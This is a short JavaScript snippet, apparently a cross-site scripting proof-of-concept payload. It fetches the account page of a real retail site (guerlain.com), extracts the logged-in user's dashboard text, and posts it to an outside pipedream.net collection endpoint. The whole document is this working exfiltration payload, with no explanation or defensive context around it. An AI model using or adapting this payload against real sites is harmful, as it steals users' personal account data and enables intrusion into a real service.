fetch("https://www.guerlain.com/fr/fr-fr/account")
  .then((response) => response.text())
  .then((html) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");
    const dashboardContent = doc
      .querySelector(".dashboard-content.container")
      ?.textContent.trim();

    fetch("https://eoy7otg07wtdi6k.m.pipedream.net", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ dashboardContent }),
    });
  });
